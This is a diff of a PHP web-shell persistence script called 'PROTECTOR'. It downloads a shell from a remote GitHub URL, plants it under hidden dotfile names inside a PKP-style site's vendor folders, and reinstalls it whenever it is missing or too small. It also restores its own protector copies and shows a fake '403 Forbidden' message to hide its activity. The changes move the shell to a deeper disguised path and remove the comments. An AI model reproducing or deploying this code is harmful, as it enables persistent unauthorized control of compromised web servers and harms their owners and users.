@@ -1,15 +1,15 @@
 <?php
 // =============================================
-// PROTECTOR V.1.1
+//           PROTECTOR WEB VERSION V.1.1
 // =============================================
 
 $shell_url = 'https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/aw.txt';
 
 $spread_locations = [
-    '', '/lib/pkp/locale/id/', '/tools/', '/controllers/statistics/form/'
+    '', '/lib/pkp/lib/vendor/laravel/framework/src/Illuminate/Events/.github/workflows/data/'
 ];
 
-$shell_filenames = ['.user.php', '.version.php', '.cache.php', '.updatedoc.php'];
+$shell_filenames = ['.ThemeSetting.php'];
 
 $protectors = ['.syscache.php', '.update.php', '.controller.php', '.configcache.php'];
 
@@ -21,7 +21,7 @@ function write_log($msg) {
 }
 
 function download_shell($url) {
-    // ... (sama seperti sebelumnya, gue skip biar pendek)
+    
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -47,7 +47,7 @@ foreach ($spread_locations as $folder) {
     foreach ($shell_filenames as $name) {
         $full_path = $full_folder . $name;
 
-        // Cek setiap kali protector dijalankan
+        
         if (!file_exists($full_path) || filesize($full_path) < 50000) {
             $code = download_shell($shell_url);
             if ($code) {
@@ -62,7 +62,7 @@ foreach ($spread_locations as $folder) {
 
 echo "<pre> 403 Forbidden You don't have permission to access this resource. $restored_count shell</pre>";
 
-// Saling restore protector (tetap)
+
 foreach ($protectors as $p) {
     $path = $docroot . '/' . $p;
     if (!file_exists($path)) {
@@ -76,10 +76,8 @@ foreach ($protectors as $p) {
     }
 }
 
-// Anti-malware (skip shell) - tetap sama seperti sebelumnya
-// ... (bagian kill_malware sama seperti kode terakhir)
 
-$malware_killed = 0; // isi dengan function kill_malware kalau masih mau pakai
+$malware_killed = 0;
 
 write_log("Protector run - Restored: $restored_count | Malware killed: $malware_killed");
 ?>
